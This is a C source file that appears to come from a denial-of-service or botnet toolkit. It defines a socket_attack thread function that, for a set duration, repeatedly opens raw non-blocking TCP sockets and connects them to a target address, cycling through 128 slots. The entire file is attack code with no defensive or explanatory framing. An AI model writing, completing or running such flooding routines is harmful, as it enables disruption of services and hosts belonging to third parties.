#define _GNU_SOURCE

#include "headers/socket_attack.h"
#include <fcntl.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <errno.h>

void* socket_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;
    time_t end = time(NULL) + params->duration;
    int s[128]; 
    time_t sock_times[128];
    int i = 0;
    struct sockaddr_in t = params->target_addr;
    int f = 1; struct timeval tv = {0};
    tv.tv_usec = 1000;
    time_t current_time;
    
    while (params->active && time(NULL) < end) {
        current_time = time(NULL);
        
        for (int j = 0; j < i; j++) {
            if (s[j] >= 0 && (current_time - sock_times[j]) > 10) {
                close(s[j]);
                s[j] = -1;
            }
        }
        
        s[i] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (s[i] >= 0) {
            sock_times[i] = current_time;
            fcntl(s[i], F_SETFL, O_NONBLOCK);
            connect(s[i], (struct sockaddr*)&t, sizeof(t));
        } else {
            s[i] = -1;
        }
        
        if (++i == 128) {
            i = 0;
        }
    }
    
    for (int j = 0; j < 128; j++) {
        if (s[j] >= 0) close(s[j]);
    }
    return NULL;
}
